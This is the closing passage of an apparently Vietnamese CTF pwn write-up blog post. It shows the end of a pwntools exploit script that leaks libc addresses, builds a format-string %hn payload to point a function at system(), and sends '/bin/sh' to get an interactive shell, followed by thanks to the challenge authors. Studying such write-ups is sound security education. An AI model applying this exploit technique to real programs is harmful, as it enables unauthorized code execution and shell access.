</span></span><span style=display:flex><span>base_convert <span style=color:#f92672>=</span> convert <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1060</span>
</span></span><span style=display:flex><span>system <span style=color:#f92672>=</span> base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50d60</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;LIBC BASE ADDRESS: &#34;</span> <span style=color:#f92672>+</span> hex(base))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;CONVERT BASE ADDRESS: &#34;</span> <span style=color:#f92672>+</span> hex(base_convert))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ad <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>ad[system <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>ad[(system <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>ad[(system <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>addr <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>addr<span style=color:#f92672>.</span>append(system <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>)
</span></span><span style=display:flex><span>addr<span style=color:#f92672>.</span>append((system <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>16</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>)
</span></span><span style=display:flex><span>addr<span style=color:#f92672>.</span>append((system <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>)
</span></span><span style=display:flex><span>addr<span style=color:#f92672>.</span>sort()
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;%</span><span style=color:#e6db74>{</span>addr[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>c%</span><span style=color:#e6db74>{</span><span style=color:#ae81ff>20</span> <span style=color:#f92672>+</span> ad[addr[<span style=color:#ae81ff>0</span>]]<span style=color:#e6db74>}</span><span style=color:#e6db74>$hn%</span><span style=color:#e6db74>{</span>addr[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>-</span> addr[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>c%</span><span style=color:#e6db74>{</span><span style=color:#ae81ff>20</span> <span style=color:#f92672>+</span> ad[addr[<span style=color:#ae81ff>1</span>]]<span style=color:#e6db74>}</span><span style=color:#e6db74>$hn%</span><span style=color:#e6db74>{</span>addr[<span style=color:#ae81ff>2</span>]<span style=color:#f92672>-</span>addr[<span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>c%</span><span style=color:#e6db74>{</span><span style=color:#ae81ff>20</span> <span style=color:#f92672>+</span> ad[addr[<span style=color:#ae81ff>2</span>]]<span style=color:#e6db74>}</span><span style=color:#e6db74>$hn&#34;</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x50</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>+=</span> p64(base_convert <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x40e0</span>) <span style=color:#f92672>+</span> p64(base_convert <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x40e0</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>+</span> p64(base_convert <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x40e0</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>)
</span></span><span style=display:flex><span>bug(p)
</span></span><span style=display:flex><span>clr()
</span></span><span style=display:flex><span>ap(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh&#39;</span>)
</span></span><span style=display:flex><span>en()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h2 id=lfyg-lời-kết-yglf><lf><yg>Lời kết</yg></lf></h2><p>Rất cảm ơn anh <code>pivik#3475</code> và <code>Cobra#4365</code> đã ra những pwn challenge hay và phù hợp với format 8 tiếng.<br>Đặc biệt bug bài java của anh Cobra rất là thú vị và khó tìm thấy :)</p></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><img class=about__logo src=https://piers-n.github.io/images/cat.png alt=Logo><h1 class=about__title>piers</h1><p class=about__description>My personal blog on the journey of learning how2pwn</p></div><ul class=aside__social-links><li><a href=https://github.com/piers-n rel=me aria-label=GitHub title=GitHub><i class="fab fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=sendhelp2703@gmail.com rel=me aria-label=Email title=Email><i class="fas fa-envelope" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>Writeup on 3 pwn challenge</p><p>By Piers,
10-12-2022</p></div></section><footer class=page__footer><p class=copyright>© 2022</p><p class=advertisement>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p></footer></div></body></html>